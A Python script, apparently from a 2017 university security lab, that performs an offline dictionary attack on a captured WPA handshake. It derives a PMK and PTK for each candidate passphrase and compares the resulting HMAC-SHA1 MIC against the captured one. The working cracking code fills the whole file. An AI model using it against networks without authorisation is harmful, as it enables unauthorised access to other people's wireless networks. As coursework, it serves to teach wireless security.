#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = "Guillaume Blanco, Patrick Neto"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "guillaume.blanco@heig-vd.ch, patrick.neto@heig-vd.ch"
__status__ 		= "Prototype"

from helpers.packet_extraction import * # L'extraction des valeurs de la capture de paquet est ici

# Chemin d'accès de la wordlist de passphrases
WORDLIST_PATH = "./wordlists/"
WORDLIST_FILE = WORDLIST_PATH + "1000-passwords.txt"

try:    
    # Lecture de la wordlist, afin de calculer un MIC avec chacun de ses mots de passe
    with open(WORDLIST_FILE) as fp:
        cnt = 1
        #Extraction de chaque mot de passe de la wordlist, afin d'en dériver une clé
        for line in fp:
            passphraseGuessed = line.rstrip("\r\n") #On enlève ici le "\n" final
            print("(" + str(cnt) + ")" + passphraseGuessed + " en test...")

            # Passphrase hashée 4096 fois pour obtenir une Pairwise Master Key
            pmkGuessed = pbkdf2_hex(passphraseGuessed, ssid, NB_HASHS, PBDF_KEY_LENGTH)

            # Passage de la Pairwise Master Key dans une fonction pseudo-aléatoire,
            # afin d'obtenir la Pairwise Transient Key
            ptkGuessed = customPRF512(a2b_hex(pmkGuessed), A, B)

            # Calcul du MIC avec un HMAC-SHA1 (information sur l'algo utilisé récoltée avec 
            # wireshark). Il est important de retire le ICV pour comparer avec le MIC à trouver
            micGuessed = hmac.new(ptkGuessed[0:16], data, hashlib.sha1).hexdigest()[:-8]

            #Affichage de la comparaison entre le MIC calculé et le MIC à trouver
            print("Comparaison de MIC: ")
            print(micGuessed + " == " + micToTest)
            print("----------------------------")

            '''Comparaison des deux MIC (celui qui a été généré avec notre wordlist et celui
            et celui qui doit être trouvé)
            Arrêt de la lecture du fichier de passphrase si le MIC trouvé est le bon'''
            if(micGuessed == micToTest):
                print("Passphrase trouvée: " + passphraseGuessed) # Affichage si passphrase trouvée
                break
            cnt += 1
finally:
    fp.close()